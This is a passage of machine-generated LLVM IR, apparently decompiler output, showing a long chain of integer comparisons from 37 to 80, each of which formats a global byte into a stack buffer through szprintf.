  %v3_10003b54 = icmp eq i32 %v2_10002f1c, 37
  br i1 %v3_10003b54, label %dec_label_pc_10003b5c, label %dec_label_pc_10003ba4

dec_label_pc_10003b5c:                            ; preds = %dec_label_pc_10003b50
  %v2_10003b5c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003b70 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003b70 = zext i8 %v3_10003b70 to i32
  %v4_10003ba0 = call i32 @szprintf(i32 %v2_10003b5c, i32 ptrtoint ([12 x i8]* @global_var_10016538.85 to i32), i32 %v4_10003b70)
  br label %dec_label_pc_10003ba4

dec_label_pc_10003ba4:                            ; preds = %dec_label_pc_10003b50, %dec_label_pc_10003b5c
  %v3_10003ba8 = icmp eq i32 %v2_10002f1c, 38
  br i1 %v3_10003ba8, label %dec_label_pc_10003bb0, label %dec_label_pc_10003bf8

dec_label_pc_10003bb0:                            ; preds = %dec_label_pc_10003ba4
  %v2_10003bb0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003bc4 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003bc4 = zext i8 %v3_10003bc4 to i32
  %v4_10003bf4 = call i32 @szprintf(i32 %v2_10003bb0, i32 ptrtoint ([13 x i8]* @global_var_10016544.86 to i32), i32 %v4_10003bc4)
  br label %dec_label_pc_10003bf8

dec_label_pc_10003bf8:                            ; preds = %dec_label_pc_10003ba4, %dec_label_pc_10003bb0
  %v3_10003bfc = icmp eq i32 %v2_10002f1c, 39
  br i1 %v3_10003bfc, label %dec_label_pc_10003c04, label %dec_label_pc_10003c4c

dec_label_pc_10003c04:                            ; preds = %dec_label_pc_10003bf8
  %v2_10003c04 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003c18 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003c18 = zext i8 %v3_10003c18 to i32
  %v4_10003c48 = call i32 @szprintf(i32 %v2_10003c04, i32 ptrtoint ([13 x i8]* @global_var_10016554.87 to i32), i32 %v4_10003c18)
  br label %dec_label_pc_10003c4c

dec_label_pc_10003c4c:                            ; preds = %dec_label_pc_10003bf8, %dec_label_pc_10003c04
  %v3_10003c50 = icmp eq i32 %v2_10002f1c, 40
  br i1 %v3_10003c50, label %dec_label_pc_10003c58, label %dec_label_pc_10003ca0

dec_label_pc_10003c58:                            ; preds = %dec_label_pc_10003c4c
  %v2_10003c58 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003c6c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003c6c = zext i8 %v3_10003c6c to i32
  %v4_10003c9c = call i32 @szprintf(i32 %v2_10003c58, i32 ptrtoint ([13 x i8]* @global_var_10016544.86 to i32), i32 %v4_10003c6c)
  br label %dec_label_pc_10003ca0

dec_label_pc_10003ca0:                            ; preds = %dec_label_pc_10003c4c, %dec_label_pc_10003c58
  %v3_10003ca4 = icmp eq i32 %v2_10002f1c, 41
  br i1 %v3_10003ca4, label %dec_label_pc_10003cac, label %dec_label_pc_10003cf4

dec_label_pc_10003cac:                            ; preds = %dec_label_pc_10003ca0
  %v2_10003cac = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003cc0 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003cc0 = zext i8 %v3_10003cc0 to i32
  %v4_10003cf0 = call i32 @szprintf(i32 %v2_10003cac, i32 ptrtoint ([13 x i8]* @global_var_10016564.88 to i32), i32 %v4_10003cc0)
  br label %dec_label_pc_10003cf4

dec_label_pc_10003cf4:                            ; preds = %dec_label_pc_10003ca0, %dec_label_pc_10003cac
  %v3_10003cf8 = icmp eq i32 %v2_10002f1c, 42
  br i1 %v3_10003cf8, label %dec_label_pc_10003d00, label %dec_label_pc_10003d48

dec_label_pc_10003d00:                            ; preds = %dec_label_pc_10003cf4
  %v2_10003d00 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003d14 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003d14 = zext i8 %v3_10003d14 to i32
  %v4_10003d44 = call i32 @szprintf(i32 %v2_10003d00, i32 ptrtoint ([13 x i8]* @global_var_10016574.89 to i32), i32 %v4_10003d14)
  br label %dec_label_pc_10003d48

dec_label_pc_10003d48:                            ; preds = %dec_label_pc_10003cf4, %dec_label_pc_10003d00
  %v3_10003d4c = icmp eq i32 %v2_10002f1c, 43
  br i1 %v3_10003d4c, label %dec_label_pc_10003d54, label %dec_label_pc_10003d9c

dec_label_pc_10003d54:                            ; preds = %dec_label_pc_10003d48
  %v2_10003d54 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003d68 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003d68 = zext i8 %v3_10003d68 to i32
  %v4_10003d98 = call i32 @szprintf(i32 %v2_10003d54, i32 ptrtoint ([13 x i8]* @global_var_10016584.90 to i32), i32 %v4_10003d68)
  br label %dec_label_pc_10003d9c

dec_label_pc_10003d9c:                            ; preds = %dec_label_pc_10003d48, %dec_label_pc_10003d54
  %v3_10003da0 = icmp eq i32 %v2_10002f1c, 44
  br i1 %v3_10003da0, label %dec_label_pc_10003da8, label %dec_label_pc_10003df0

dec_label_pc_10003da8:                            ; preds = %dec_label_pc_10003d9c
  %v2_10003da8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003dbc = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003dbc = zext i8 %v3_10003dbc to i32
  %v4_10003dec = call i32 @szprintf(i32 %v2_10003da8, i32 ptrtoint ([13 x i8]* @global_var_10016574.89 to i32), i32 %v4_10003dbc)
  br label %dec_label_pc_10003df0

dec_label_pc_10003df0:                            ; preds = %dec_label_pc_10003d9c, %dec_label_pc_10003da8
  %v3_10003df4 = icmp eq i32 %v2_10002f1c, 45
  br i1 %v3_10003df4, label %dec_label_pc_10003dfc, label %dec_label_pc_10003e44

dec_label_pc_10003dfc:                            ; preds = %dec_label_pc_10003df0
  %v2_10003dfc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003e10 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003e10 = zext i8 %v3_10003e10 to i32
  %v4_10003e40 = call i32 @szprintf(i32 %v2_10003dfc, i32 ptrtoint ([13 x i8]* @global_var_10016594.91 to i32), i32 %v4_10003e10)
  br label %dec_label_pc_10003e44

dec_label_pc_10003e44:                            ; preds = %dec_label_pc_10003df0, %dec_label_pc_10003dfc
  %v3_10003e48 = icmp eq i32 %v2_10002f1c, 46
  br i1 %v3_10003e48, label %dec_label_pc_10003e50, label %dec_label_pc_10003e98

dec_label_pc_10003e50:                            ; preds = %dec_label_pc_10003e44
  %v2_10003e50 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003e64 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003e64 = zext i8 %v3_10003e64 to i32
  %v4_10003e94 = call i32 @szprintf(i32 %v2_10003e50, i32 ptrtoint ([13 x i8]* @global_var_100165a4.92 to i32), i32 %v4_10003e64)
  br label %dec_label_pc_10003e98

dec_label_pc_10003e98:                            ; preds = %dec_label_pc_10003e44, %dec_label_pc_10003e50
  %v3_10003e9c = icmp eq i32 %v2_10002f1c, 47
  br i1 %v3_10003e9c, label %dec_label_pc_10003ea4, label %dec_label_pc_10003eec

dec_label_pc_10003ea4:                            ; preds = %dec_label_pc_10003e98
  %v2_10003ea4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003eb8 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003eb8 = zext i8 %v3_10003eb8 to i32
  %v4_10003ee8 = call i32 @szprintf(i32 %v2_10003ea4, i32 ptrtoint ([13 x i8]* @global_var_100165b4.93 to i32), i32 %v4_10003eb8)
  br label %dec_label_pc_10003eec

dec_label_pc_10003eec:                            ; preds = %dec_label_pc_10003e98, %dec_label_pc_10003ea4
  %v3_10003ef0 = icmp eq i32 %v2_10002f1c, 48
  br i1 %v3_10003ef0, label %dec_label_pc_10003ef8, label %dec_label_pc_10003f40

dec_label_pc_10003ef8:                            ; preds = %dec_label_pc_10003eec
  %v2_10003ef8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003f0c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003f0c = zext i8 %v3_10003f0c to i32
  %v4_10003f3c = call i32 @szprintf(i32 %v2_10003ef8, i32 ptrtoint ([13 x i8]* @global_var_100165c4.94 to i32), i32 %v4_10003f0c)
  br label %dec_label_pc_10003f40

dec_label_pc_10003f40:                            ; preds = %dec_label_pc_10003eec, %dec_label_pc_10003ef8
  %v3_10003f44 = icmp eq i32 %v2_10002f1c, 49
  br i1 %v3_10003f44, label %dec_label_pc_10003f4c, label %dec_label_pc_10003f94

dec_label_pc_10003f4c:                            ; preds = %dec_label_pc_10003f40
  %v2_10003f4c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003f60 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003f60 = zext i8 %v3_10003f60 to i32
  %v4_10003f90 = call i32 @szprintf(i32 %v2_10003f4c, i32 ptrtoint ([13 x i8]* @global_var_100165d4.95 to i32), i32 %v4_10003f60)
  br label %dec_label_pc_10003f94

dec_label_pc_10003f94:                            ; preds = %dec_label_pc_10003f40, %dec_label_pc_10003f4c
  %v3_10003f98 = icmp eq i32 %v2_10002f1c, 50
  br i1 %v3_10003f98, label %dec_label_pc_10003fa0, label %dec_label_pc_10003fe8

dec_label_pc_10003fa0:                            ; preds = %dec_label_pc_10003f94
  %v2_10003fa0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003fb4 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003fb4 = zext i8 %v3_10003fb4 to i32
  %v4_10003fe4 = call i32 @szprintf(i32 %v2_10003fa0, i32 ptrtoint ([13 x i8]* @global_var_100165e4.96 to i32), i32 %v4_10003fb4)
  br label %dec_label_pc_10003fe8

dec_label_pc_10003fe8:                            ; preds = %dec_label_pc_10003f94, %dec_label_pc_10003fa0
  %v3_10003fec = icmp eq i32 %v2_10002f1c, 51
  br i1 %v3_10003fec, label %dec_label_pc_10003ff4, label %dec_label_pc_1000403c

dec_label_pc_10003ff4:                            ; preds = %dec_label_pc_10003fe8
  %v2_10003ff4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004008 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10004008 = zext i8 %v3_10004008 to i32
  %v4_10004038 = call i32 @szprintf(i32 %v2_10003ff4, i32 ptrtoint ([14 x i8]* @global_var_100165f4.97 to i32), i32 %v4_10004008)
  br label %dec_label_pc_1000403c

dec_label_pc_1000403c:                            ; preds = %dec_label_pc_10003fe8, %dec_label_pc_10003ff4
  %v3_10004040 = icmp eq i32 %v2_10002f1c, 52
  br i1 %v3_10004040, label %dec_label_pc_10004048, label %dec_label_pc_10004090

dec_label_pc_10004048:                            ; preds = %dec_label_pc_1000403c
  %v2_10004048 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000405c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_1000405c = zext i8 %v3_1000405c to i32
  %v4_1000408c = call i32 @szprintf(i32 %v2_10004048, i32 ptrtoint ([13 x i8]* @global_var_10016604.98 to i32), i32 %v4_1000405c)
  br label %dec_label_pc_10004090

dec_label_pc_10004090:                            ; preds = %dec_label_pc_1000403c, %dec_label_pc_10004048
  %v3_10004094 = icmp eq i32 %v2_10002f1c, 53
  br i1 %v3_10004094, label %dec_label_pc_1000409c, label %dec_label_pc_100040e4

dec_label_pc_1000409c:                            ; preds = %dec_label_pc_10004090
  %v2_1000409c = ptrtoint i32* %stack_var_-52 to i32
  %v3_100040b0 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100040b0 = zext i8 %v3_100040b0 to i32
  %v4_100040e0 = call i32 @szprintf(i32 %v2_1000409c, i32 ptrtoint ([14 x i8]* @global_var_10016614.99 to i32), i32 %v4_100040b0)
  br label %dec_label_pc_100040e4

dec_label_pc_100040e4:                            ; preds = %dec_label_pc_10004090, %dec_label_pc_1000409c
  %v3_100040e8 = icmp eq i32 %v2_10002f1c, 54
  br i1 %v3_100040e8, label %dec_label_pc_100040f0, label %dec_label_pc_10004138

dec_label_pc_100040f0:                            ; preds = %dec_label_pc_100040e4
  %v2_100040f0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004104 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10004104 = zext i8 %v3_10004104 to i32
  %v4_10004134 = call i32 @szprintf(i32 %v2_100040f0, i32 ptrtoint ([13 x i8]* @global_var_10016624.100 to i32), i32 %v4_10004104)
  br label %dec_label_pc_10004138

dec_label_pc_10004138:                            ; preds = %dec_label_pc_100040e4, %dec_label_pc_100040f0
  %v3_1000413c = icmp eq i32 %v2_10002f1c, 55
  br i1 %v3_1000413c, label %dec_label_pc_10004144, label %dec_label_pc_1000418c

dec_label_pc_10004144:                            ; preds = %dec_label_pc_10004138
  %v2_10004144 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004158 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10004158 = zext i8 %v3_10004158 to i32
  %v4_10004188 = call i32 @szprintf(i32 %v2_10004144, i32 ptrtoint ([14 x i8]* @global_var_10016634.101 to i32), i32 %v4_10004158)
  br label %dec_label_pc_1000418c

dec_label_pc_1000418c:                            ; preds = %dec_label_pc_10004138, %dec_label_pc_10004144
  %v3_10004190 = icmp eq i32 %v2_10002f1c, 56
  br i1 %v3_10004190, label %dec_label_pc_10004198, label %dec_label_pc_100041e0

dec_label_pc_10004198:                            ; preds = %dec_label_pc_1000418c
  %v2_10004198 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100041ac = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100041ac = zext i8 %v3_100041ac to i32
  %v4_100041dc = call i32 @szprintf(i32 %v2_10004198, i32 ptrtoint ([14 x i8]* @global_var_10016644.102 to i32), i32 %v4_100041ac)
  br label %dec_label_pc_100041e0

dec_label_pc_100041e0:                            ; preds = %dec_label_pc_1000418c, %dec_label_pc_10004198
  %v3_100041e4 = icmp eq i32 %v2_10002f1c, 57
  br i1 %v3_100041e4, label %dec_label_pc_100041ec, label %dec_label_pc_10004234

dec_label_pc_100041ec:                            ; preds = %dec_label_pc_100041e0
  %v2_100041ec = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004200 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10004200 = zext i8 %v3_10004200 to i32
  %v4_10004230 = call i32 @szprintf(i32 %v2_100041ec, i32 ptrtoint ([13 x i8]* @global_var_10016654.103 to i32), i32 %v4_10004200)
  br label %dec_label_pc_10004234

dec_label_pc_10004234:                            ; preds = %dec_label_pc_100041e0, %dec_label_pc_100041ec
  %v3_10004238 = icmp eq i32 %v2_10002f1c, 58
  br i1 %v3_10004238, label %dec_label_pc_10004240, label %dec_label_pc_10004288

dec_label_pc_10004240:                            ; preds = %dec_label_pc_10004234
  %v2_10004240 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004254 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10004254 = zext i8 %v3_10004254 to i32
  %v4_10004284 = call i32 @szprintf(i32 %v2_10004240, i32 ptrtoint ([13 x i8]* @global_var_10016664.104 to i32), i32 %v4_10004254)
  br label %dec_label_pc_10004288

dec_label_pc_10004288:                            ; preds = %dec_label_pc_10004234, %dec_label_pc_10004240
  %v3_1000428c = icmp eq i32 %v2_10002f1c, 59
  br i1 %v3_1000428c, label %dec_label_pc_10004294, label %dec_label_pc_100042dc

dec_label_pc_10004294:                            ; preds = %dec_label_pc_10004288
  %v2_10004294 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100042a8 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100042a8 = zext i8 %v3_100042a8 to i32
  %v4_100042d8 = call i32 @szprintf(i32 %v2_10004294, i32 ptrtoint ([13 x i8]* @global_var_10016674.105 to i32), i32 %v4_100042a8)
  br label %dec_label_pc_100042dc

dec_label_pc_100042dc:                            ; preds = %dec_label_pc_10004288, %dec_label_pc_10004294
  %v3_100042e0 = icmp eq i32 %v2_10002f1c, 60
  br i1 %v3_100042e0, label %dec_label_pc_100042e8, label %dec_label_pc_10004330

dec_label_pc_100042e8:                            ; preds = %dec_label_pc_100042dc
  %v2_100042e8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100042fc = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100042fc = zext i8 %v3_100042fc to i32
  %v4_1000432c = call i32 @szprintf(i32 %v2_100042e8, i32 ptrtoint ([13 x i8]* @global_var_10016684.106 to i32), i32 %v4_100042fc)
  br label %dec_label_pc_10004330

dec_label_pc_10004330:                            ; preds = %dec_label_pc_100042dc, %dec_label_pc_100042e8
  %v3_10004334 = icmp eq i32 %v2_10002f1c, 61
  br i1 %v3_10004334, label %dec_label_pc_1000433c, label %dec_label_pc_10004384

dec_label_pc_1000433c:                            ; preds = %dec_label_pc_10004330
  %v2_1000433c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004350 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10004350 = zext i8 %v3_10004350 to i32
  %v4_10004380 = call i32 @szprintf(i32 %v2_1000433c, i32 ptrtoint ([13 x i8]* @global_var_10016694.107 to i32), i32 %v4_10004350)
  br label %dec_label_pc_10004384

dec_label_pc_10004384:                            ; preds = %dec_label_pc_10004330, %dec_label_pc_1000433c
  %v3_10004388 = icmp eq i32 %v2_10002f1c, 62
  br i1 %v3_10004388, label %dec_label_pc_10004390, label %dec_label_pc_100043d8

dec_label_pc_10004390:                            ; preds = %dec_label_pc_10004384
  %v2_10004390 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100043a4 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100043a4 = zext i8 %v3_100043a4 to i32
  %v4_100043d4 = call i32 @szprintf(i32 %v2_10004390, i32 ptrtoint ([13 x i8]* @global_var_100166a4.108 to i32), i32 %v4_100043a4)
  br label %dec_label_pc_100043d8

dec_label_pc_100043d8:                            ; preds = %dec_label_pc_10004384, %dec_label_pc_10004390
  %v3_100043dc = icmp eq i32 %v2_10002f1c, 63
  br i1 %v3_100043dc, label %dec_label_pc_100043e4, label %dec_label_pc_1000442c

dec_label_pc_100043e4:                            ; preds = %dec_label_pc_100043d8
  %v2_100043e4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100043f8 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100043f8 = zext i8 %v3_100043f8 to i32
  %v4_10004428 = call i32 @szprintf(i32 %v2_100043e4, i32 ptrtoint ([13 x i8]* @global_var_100166b4.109 to i32), i32 %v4_100043f8)
  br label %dec_label_pc_1000442c

dec_label_pc_1000442c:                            ; preds = %dec_label_pc_100043d8, %dec_label_pc_100043e4
  %v3_10004430 = icmp eq i32 %v2_10002f1c, 64
  br i1 %v3_10004430, label %dec_label_pc_10004438, label %dec_label_pc_10004480

dec_label_pc_10004438:                            ; preds = %dec_label_pc_1000442c
  %v2_10004438 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000444c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_1000444c = zext i8 %v3_1000444c to i32
  %v4_1000447c = call i32 @szprintf(i32 %v2_10004438, i32 ptrtoint ([13 x i8]* @global_var_100166c4.110 to i32), i32 %v4_1000444c)
  br label %dec_label_pc_10004480

dec_label_pc_10004480:                            ; preds = %dec_label_pc_1000442c, %dec_label_pc_10004438
  %v3_10004484 = icmp eq i32 %v2_10002f1c, 65
  br i1 %v3_10004484, label %dec_label_pc_1000448c, label %dec_label_pc_100044d4

dec_label_pc_1000448c:                            ; preds = %dec_label_pc_10004480
  %v2_1000448c = ptrtoint i32* %stack_var_-52 to i32
  %v3_100044a0 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100044a0 = zext i8 %v3_100044a0 to i32
  %v4_100044d0 = call i32 @szprintf(i32 %v2_1000448c, i32 ptrtoint ([13 x i8]* @global_var_100166d4.111 to i32), i32 %v4_100044a0)
  br label %dec_label_pc_100044d4

dec_label_pc_100044d4:                            ; preds = %dec_label_pc_10004480, %dec_label_pc_1000448c
  %v3_100044d8 = icmp eq i32 %v2_10002f1c, 66
  br i1 %v3_100044d8, label %dec_label_pc_100044e0, label %dec_label_pc_10004528

dec_label_pc_100044e0:                            ; preds = %dec_label_pc_100044d4
  %v2_100044e0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100044f4 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100044f4 = zext i8 %v3_100044f4 to i32
  %v4_10004524 = call i32 @szprintf(i32 %v2_100044e0, i32 ptrtoint ([13 x i8]* @global_var_100166e4.112 to i32), i32 %v4_100044f4)
  br label %dec_label_pc_10004528

dec_label_pc_10004528:                            ; preds = %dec_label_pc_100044d4, %dec_label_pc_100044e0
  %v3_1000452c = icmp eq i32 %v2_10002f1c, 67
  br i1 %v3_1000452c, label %dec_label_pc_10004534, label %dec_label_pc_1000457c

dec_label_pc_10004534:                            ; preds = %dec_label_pc_10004528
  %v2_10004534 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004548 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10004548 = zext i8 %v3_10004548 to i32
  %v4_10004578 = call i32 @szprintf(i32 %v2_10004534, i32 ptrtoint ([13 x i8]* @global_var_100166f4.113 to i32), i32 %v4_10004548)
  br label %dec_label_pc_1000457c

dec_label_pc_1000457c:                            ; preds = %dec_label_pc_10004528, %dec_label_pc_10004534
  %v3_10004580 = icmp eq i32 %v2_10002f1c, 68
  br i1 %v3_10004580, label %dec_label_pc_10004588, label %dec_label_pc_100045d0

dec_label_pc_10004588:                            ; preds = %dec_label_pc_1000457c
  %v2_10004588 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000459c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_1000459c = zext i8 %v3_1000459c to i32
  %v4_100045cc = call i32 @szprintf(i32 %v2_10004588, i32 ptrtoint ([13 x i8]* @global_var_10016704.114 to i32), i32 %v4_1000459c)
  br label %dec_label_pc_100045d0

dec_label_pc_100045d0:                            ; preds = %dec_label_pc_1000457c, %dec_label_pc_10004588
  %v3_100045d4 = icmp eq i32 %v2_10002f1c, 69
  br i1 %v3_100045d4, label %dec_label_pc_100045dc, label %dec_label_pc_10004624

dec_label_pc_100045dc:                            ; preds = %dec_label_pc_100045d0
  %v2_100045dc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100045f0 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100045f0 = zext i8 %v3_100045f0 to i32
  %v4_10004620 = call i32 @szprintf(i32 %v2_100045dc, i32 ptrtoint ([13 x i8]* @global_var_10016714.115 to i32), i32 %v4_100045f0)
  br label %dec_label_pc_10004624

dec_label_pc_10004624:                            ; preds = %dec_label_pc_100045d0, %dec_label_pc_100045dc
  %v3_10004628 = icmp eq i32 %v2_10002f1c, 70
  br i1 %v3_10004628, label %dec_label_pc_10004630, label %dec_label_pc_10004678

dec_label_pc_10004630:                            ; preds = %dec_label_pc_10004624
  %v2_10004630 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004644 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10004644 = zext i8 %v3_10004644 to i32
  %v4_10004674 = call i32 @szprintf(i32 %v2_10004630, i32 ptrtoint ([13 x i8]* @global_var_10016724.116 to i32), i32 %v4_10004644)
  br label %dec_label_pc_10004678

dec_label_pc_10004678:                            ; preds = %dec_label_pc_10004624, %dec_label_pc_10004630
  %v3_1000467c = icmp eq i32 %v2_10002f1c, 71
  br i1 %v3_1000467c, label %dec_label_pc_10004684, label %dec_label_pc_100046cc

dec_label_pc_10004684:                            ; preds = %dec_label_pc_10004678
  %v2_10004684 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004698 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10004698 = zext i8 %v3_10004698 to i32
  %v4_100046c8 = call i32 @szprintf(i32 %v2_10004684, i32 ptrtoint ([13 x i8]* @global_var_10016734.117 to i32), i32 %v4_10004698)
  br label %dec_label_pc_100046cc

dec_label_pc_100046cc:                            ; preds = %dec_label_pc_10004678, %dec_label_pc_10004684
  %v3_100046d0 = icmp eq i32 %v2_10002f1c, 72
  br i1 %v3_100046d0, label %dec_label_pc_100046d8, label %dec_label_pc_10004720

dec_label_pc_100046d8:                            ; preds = %dec_label_pc_100046cc
  %v2_100046d8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100046ec = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100046ec = zext i8 %v3_100046ec to i32
  %v4_1000471c = call i32 @szprintf(i32 %v2_100046d8, i32 ptrtoint ([13 x i8]* @global_var_10016744.118 to i32), i32 %v4_100046ec)
  br label %dec_label_pc_10004720

dec_label_pc_10004720:                            ; preds = %dec_label_pc_100046cc, %dec_label_pc_100046d8
  %v3_10004724 = icmp eq i32 %v2_10002f1c, 73
  br i1 %v3_10004724, label %dec_label_pc_1000472c, label %dec_label_pc_10004774

dec_label_pc_1000472c:                            ; preds = %dec_label_pc_10004720
  %v2_1000472c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004740 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10004740 = zext i8 %v3_10004740 to i32
  %v4_10004770 = call i32 @szprintf(i32 %v2_1000472c, i32 ptrtoint ([13 x i8]* @global_var_10016754.119 to i32), i32 %v4_10004740)
  br label %dec_label_pc_10004774

dec_label_pc_10004774:                            ; preds = %dec_label_pc_10004720, %dec_label_pc_1000472c
  %v3_10004778 = icmp eq i32 %v2_10002f1c, 74
  br i1 %v3_10004778, label %dec_label_pc_10004780, label %dec_label_pc_100047c8

dec_label_pc_10004780:                            ; preds = %dec_label_pc_10004774
  %v2_10004780 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004794 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10004794 = zext i8 %v3_10004794 to i32
  %v4_100047c4 = call i32 @szprintf(i32 %v2_10004780, i32 ptrtoint ([13 x i8]* @global_var_10016764.120 to i32), i32 %v4_10004794)
  br label %dec_label_pc_100047c8

dec_label_pc_100047c8:                            ; preds = %dec_label_pc_10004774, %dec_label_pc_10004780
  %v3_100047cc = icmp eq i32 %v2_10002f1c, 75
  br i1 %v3_100047cc, label %dec_label_pc_100047d4, label %dec_label_pc_1000481c

dec_label_pc_100047d4:                            ; preds = %dec_label_pc_100047c8
  %v2_100047d4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100047e8 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100047e8 = zext i8 %v3_100047e8 to i32
  %v4_10004818 = call i32 @szprintf(i32 %v2_100047d4, i32 ptrtoint ([13 x i8]* @global_var_10016774.121 to i32), i32 %v4_100047e8)
  br label %dec_label_pc_1000481c

dec_label_pc_1000481c:                            ; preds = %dec_label_pc_100047c8, %dec_label_pc_100047d4
  %v3_10004820 = icmp eq i32 %v2_10002f1c, 76
  br i1 %v3_10004820, label %dec_label_pc_10004828, label %dec_label_pc_10004870

dec_label_pc_10004828:                            ; preds = %dec_label_pc_1000481c
  %v2_10004828 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000483c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_1000483c = zext i8 %v3_1000483c to i32
  %v4_1000486c = call i32 @szprintf(i32 %v2_10004828, i32 ptrtoint ([13 x i8]* @global_var_10016784.122 to i32), i32 %v4_1000483c)
  br label %dec_label_pc_10004870

dec_label_pc_10004870:                            ; preds = %dec_label_pc_1000481c, %dec_label_pc_10004828
  %v3_10004874 = icmp eq i32 %v2_10002f1c, 77
  br i1 %v3_10004874, label %dec_label_pc_1000487c, label %dec_label_pc_100048c4

dec_label_pc_1000487c:                            ; preds = %dec_label_pc_10004870
  %v2_1000487c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004890 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10004890 = zext i8 %v3_10004890 to i32
  %v4_100048c0 = call i32 @szprintf(i32 %v2_1000487c, i32 ptrtoint ([13 x i8]* @global_var_10016794.123 to i32), i32 %v4_10004890)
  br label %dec_label_pc_100048c4

dec_label_pc_100048c4:                            ; preds = %dec_label_pc_10004870, %dec_label_pc_1000487c
  %v3_100048c8 = icmp eq i32 %v2_10002f1c, 78
  br i1 %v3_100048c8, label %dec_label_pc_100048d0, label %dec_label_pc_10004918

dec_label_pc_100048d0:                            ; preds = %dec_label_pc_100048c4
  %v2_100048d0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100048e4 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100048e4 = zext i8 %v3_100048e4 to i32
  %v4_10004914 = call i32 @szprintf(i32 %v2_100048d0, i32 ptrtoint ([13 x i8]* @global_var_100167a4.124 to i32), i32 %v4_100048e4)
  br label %dec_label_pc_10004918

dec_label_pc_10004918:                            ; preds = %dec_label_pc_100048c4, %dec_label_pc_100048d0
  %v3_1000491c = icmp eq i32 %v2_10002f1c, 79
  br i1 %v3_1000491c, label %dec_label_pc_10004924, label %dec_label_pc_1000496c

dec_label_pc_10004924:                            ; preds = %dec_label_pc_10004918
  %v2_10004924 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004938 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10004938 = zext i8 %v3_10004938 to i32
  %v4_10004968 = call i32 @szprintf(i32 %v2_10004924, i32 ptrtoint ([13 x i8]* @global_var_100167b4.125 to i32), i32 %v4_10004938)
  br label %dec_label_pc_1000496c

dec_label_pc_1000496c:                            ; preds = %dec_label_pc_10004918, %dec_label_pc_10004924
  %v3_10004970 = icmp eq i32 %v2_10002f1c, 80
